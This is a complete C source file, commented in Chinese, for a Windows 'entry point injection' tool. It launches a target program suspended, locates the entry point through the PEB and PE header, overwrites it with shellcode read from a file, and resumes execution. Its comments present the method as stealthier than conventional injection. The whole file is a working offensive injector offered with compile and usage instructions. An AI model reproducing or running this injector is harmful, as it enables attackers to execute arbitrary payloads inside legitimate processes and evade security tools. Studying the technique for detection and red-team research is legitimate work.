/**
 * ===================================================================
 * Entry Point Injection - 入口点注入技术
 * ===================================================================
 *
 * 技术原理：
 * 1. 创建挂起的目标进程（CREATE_SUSPENDED）
 * 2. 读取进程 PEB，获取 ImageBase（镜像基址）
 * 3. 解析 PE 头，获取 AddressOfEntryPoint（入口点 RVA）
 * 4. 计算入口点绝对地址：EntryPoint = ImageBase + AddressOfEntryPoint
 * 5. 将 shellcode 直接写入入口点地址
 * 6. 恢复线程执行，进程从 shellcode 开始运行
 *
 * 技术特点：
 * - 无需 VirtualAllocEx（不分配新内存）
 * - Shellcode 位于进程自己的代码段
 * - 入口点是天然可执行的内存
 * - 比传统注入更隐蔽
 *
 * 参考：https://www.ired.team/offensive-security/code-injection-process-injection/addressofentrypoint-code-injection-without-virtualallocex-rwx
 * 作者：基于 timwhitez 的研究实现
 * 编译：gcc entry_point_injection.c -o entry_point_injection.exe -lntdll
 * 用法：entry_point_injection.exe <目标程序> <shellcode文件>
 * ===================================================================
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// ===== NT API 函数声明 =====
// NtQueryInformationProcess 已在 winternl.h 中声明，直接使用

typedef NTSTATUS (NTAPI *_NtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *_NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// 全局函数指针
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtProtectVirtualMemory pNtProtectVirtualMemory;

// ===== 函数声明 =====
BOOL InitializeNtFunctions();
BOOL ReadShellcodeFile(const char* filename, BYTE** ppShellcode, DWORD* pSize);
BOOL CreateSuspendedProcess(const char* targetPath, PROCESS_INFORMATION* pPi);
PVOID GetEntryPoint(HANDLE hProcess, PROCESS_BASIC_INFORMATION* pPbi);
BOOL InjectShellcodeToEntryPoint(HANDLE hProcess, PVOID entryPoint, BYTE* shellcode, DWORD size);

/**
 * ===================================================================
 * 主函数
 * ===================================================================
 */
int main(int argc, char* argv[]) {
    printf("======================================\n");
    printf("  Entry Point Injection 技术\n");
    printf("======================================\n\n");

    // 检查命令行参数
    if (argc != 3) {
        printf("用法：%s <目标程序> <shellcode文件>\n", argv[0]);
        printf("示例：%s C:\\Windows\\System32\\notepad.exe payload.bin\n\n", argv[0]);
        return 1;
    }

    const char* targetPath = argv[1];
    const char* shellcodePath = argv[2];

    // [0] 初始化 NT API
    if (!InitializeNtFunctions()) {
        printf("错误：无法初始化 NT API 函数\n");
        return 1;
    }

    // [1] 读取 shellcode
    printf("[1] 读取 shellcode 文件\n");
    printf("    文件：%s\n", shellcodePath);

    BYTE* shellcode = NULL;
    DWORD shellcodeSize = 0;

    if (!ReadShellcodeFile(shellcodePath, &shellcode, &shellcodeSize)) {
        printf("错误：无法读取 shellcode 文件\n");
        return 1;
    }

    printf("    大小：%u 字节\n", shellcodeSize);
    printf("    ✓ Shellcode 读取成功\n\n");

    // [2] 创建挂起的目标进程
    printf("[2] 创建挂起的目标进程\n");
    printf("    目标：%s\n", targetPath);

    PROCESS_INFORMATION pi = {0};
    if (!CreateSuspendedProcess(targetPath, &pi)) {
        printf("错误：无法创建挂起进程\n");
        free(shellcode);
        return 1;
    }

    printf("    进程 PID：%u\n", pi.dwProcessId);
    printf("    线程 TID：%u\n", pi.dwThreadId);
    printf("    ✓ 进程已创建（挂起状态）\n\n");

    // [3] 获取进程信息
    printf("[3] 查询进程基础信息\n");

    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG returnLength = 0;
    NTSTATUS status = NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status != 0) {
        printf("错误：NtQueryInformationProcess 失败（状态码：0x%lX）\n", status);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    printf("    PEB 地址：0x%p\n", pbi.PebBaseAddress);
    printf("    ✓ 进程信息查询成功\n\n");

    // [4] 获取入口点地址
    printf("[4] 获取进程入口点地址\n");

    PVOID entryPoint = GetEntryPoint(pi.hProcess, &pbi);
    if (!entryPoint) {
        printf("错误：无法获取入口点地址\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    printf("    入口点地址：0x%p\n", entryPoint);
    printf("    ✓ 入口点定位成功\n\n");

    // [5] 注入 shellcode 到入口点
    printf("[5] 将 shellcode 写入入口点\n");

    if (!InjectShellcodeToEntryPoint(pi.hProcess, entryPoint, shellcode, shellcodeSize)) {
        printf("错误：Shellcode 注入失败\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    printf("    ✓ Shellcode 注入成功\n\n");

    // [6] 恢复线程执行
    printf("[6] 恢复主线程执行\n");

    DWORD suspendCount = ResumeThread(pi.hThread);
    if (suspendCount == (DWORD)-1) {
        printf("错误：ResumeThread 失败（错误码：%u）\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        free(shellcode);
        return 1;
    }

    printf("    ✓ 线程已恢复，进程从入口点 shellcode 开始执行\n\n");

    printf("======================================\n");
    printf("✓ Entry Point Injection 完成\n");
    printf("进程 PID：%u\n", pi.dwProcessId);
    printf("入口点：0x%p\n", entryPoint);
    printf("======================================\n");

    // 清理资源
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    free(shellcode);

    return 0;
}

/**
 * ===================================================================
 * 初始化 NT API 函数指针
 * ===================================================================
 */
BOOL InitializeNtFunctions() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        return FALSE;
    }

    // NtQueryInformationProcess 使用系统声明，不需要获取
    pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");

    if (!pNtWriteVirtualMemory || !pNtProtectVirtualMemory) {
        return FALSE;
    }

    return TRUE;
}

/**
 * ===================================================================
 * 读取 shellcode 文件
 * ===================================================================
 */
BOOL ReadShellcodeFile(const char* filename, BYTE** ppShellcode, DWORD* pSize) {
    HANDLE hFile = CreateFileA(
        filename,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("错误：无法打开文件（错误码：%u）\n", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("错误：无法获取文件大小\n");
        CloseHandle(hFile);
        return FALSE;
    }

    BYTE* buffer = (BYTE*)malloc(fileSize);
    if (!buffer) {
        printf("错误：内存分配失败\n");
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        printf("错误：文件读取失败（错误码：%u）\n", GetLastError());
        free(buffer);
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);

    *ppShellcode = buffer;
    *pSize = fileSize;

    return TRUE;
}

/**
 * ===================================================================
 * 创建挂起的目标进程
 * ===================================================================
 */
BOOL CreateSuspendedProcess(const char* targetPath, PROCESS_INFORMATION* pPi) {
    STARTUPINFOA si = {0};
    si.cb = sizeof(STARTUPINFOA);

    // 创建可修改的命令行缓冲区
    char cmdLine[MAX_PATH * 2];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\"", targetPath);

    // 创建挂起的进程
    if (!CreateProcessA(
        NULL,                   // 应用程序名
        cmdLine,                // 命令行
        NULL,                   // 进程安全属性
        NULL,                   // 线程安全属性
        FALSE,                  // 不继承句柄
        CREATE_SUSPENDED,       // 挂起模式 ★
        NULL,                   // 环境变量
        NULL,                   // 当前目录
        &si,                    // 启动信息
        pPi                     // 进程信息（返回）
    )) {
        printf("错误：CreateProcessA 失败（错误码：%u）\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

/**
 * ===================================================================
 * 获取进程入口点地址
 *
 * 步骤：
 * 1. 从 PEB 读取 ImageBase（镜像基址）
 * 2. 读取 PE 头部（DOS 头 + NT 头）
 * 3. 解析 AddressOfEntryPoint（入口点 RVA）
 * 4. 计算绝对地址：EntryPoint = ImageBase + AddressOfEntryPoint
 * ===================================================================
 */
PVOID GetEntryPoint(HANDLE hProcess, PROCESS_BASIC_INFORMATION* pPbi) {
    // 第一步：从 PEB + 0x10 读取 ImageBase
    // PEB 结构：
    //   +0x00: Reserved
    //   +0x08: BeingDebugged
    //   +0x10: ImageBaseAddress ← 我们需要的
    PVOID pebImageBaseOffset = (PVOID)((ULONG_PTR)pPbi->PebBaseAddress + 0x10);

    PVOID imageBase = NULL;
    SIZE_T bytesRead = 0;

    if (!ReadProcessMemory(hProcess, pebImageBaseOffset, &imageBase, sizeof(imageBase), &bytesRead)) {
        printf("错误：读取 ImageBase 失败（错误码：%u）\n", GetLastError());
        return NULL;
    }

    printf("    ImageBase：0x%p\n", imageBase);

    // 第二步：读取 PE 头部（前 4096 字节足够）
    BYTE headersBuffer[4096] = {0};
    if (!ReadProcessMemory(hProcess, imageBase, headersBuffer, sizeof(headersBuffer), &bytesRead)) {
        printf("错误：读取 PE 头失败（错误码：%u）\n", GetLastError());
        return NULL;
    }

    // 第三步：解析 PE 头
    // DOS 头
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("错误：无效的 DOS 签名\n");
        return NULL;
    }

    // NT 头
    PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)(headersBuffer + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        printf("错误：无效的 NT 签名\n");
        return NULL;
    }

    // 第四步：计算入口点绝对地址
    DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
    PVOID entryPoint = (PVOID)((ULONG_PTR)imageBase + entryPointRVA);

    printf("    AddressOfEntryPoint (RVA)：0x%X\n", entryPointRVA);

    return entryPoint;
}

/**
 * ===================================================================
 * 注入 shellcode 到入口点
 *
 * 步骤：
 * 1. 修改入口点内存保护为 PAGE_READWRITE
 * 2. 写入 shellcode
 * 3. 恢复原始内存保护
 * ===================================================================
 */
BOOL InjectShellcodeToEntryPoint(HANDLE hProcess, PVOID entryPoint, BYTE* shellcode, DWORD size) {
    // 第一步：修改内存保护为可写
    PVOID baseAddress = entryPoint;
    SIZE_T regionSize = size;
    ULONG oldProtect = 0;

    NTSTATUS status = pNtProtectVirtualMemory(
        hProcess,
        &baseAddress,
        &regionSize,
        PAGE_READWRITE,
        &oldProtect
    );

    if (status != 0) {
        printf("错误：NtProtectVirtualMemory 失败（状态码：0x%lX）\n", status);
        return FALSE;
    }

    printf("    原始保护：0x%lX\n", oldProtect);

    // 第二步：写入 shellcode
    SIZE_T bytesWritten = 0;
    status = pNtWriteVirtualMemory(
        hProcess,
        entryPoint,
        shellcode,
        size,
        &bytesWritten
    );

    if (status != 0 || bytesWritten != size) {
        printf("错误：NtWriteVirtualMemory 失败（状态码：0x%lX）\n", status);
        return FALSE;
    }

    printf("    写入字节：%zu / %u\n", bytesWritten, size);

    // 第三步：恢复原始保护
    baseAddress = entryPoint;
    regionSize = size;
    ULONG dummy = 0;

    status = pNtProtectVirtualMemory(
        hProcess,
        &baseAddress,
        &regionSize,
        oldProtect,
        &dummy
    );

    if (status != 0) {
        printf("警告：无法恢复原始保护（状态码：0x%lX）\n", status);
        // 不视为致命错误
    }

    return TRUE;
}
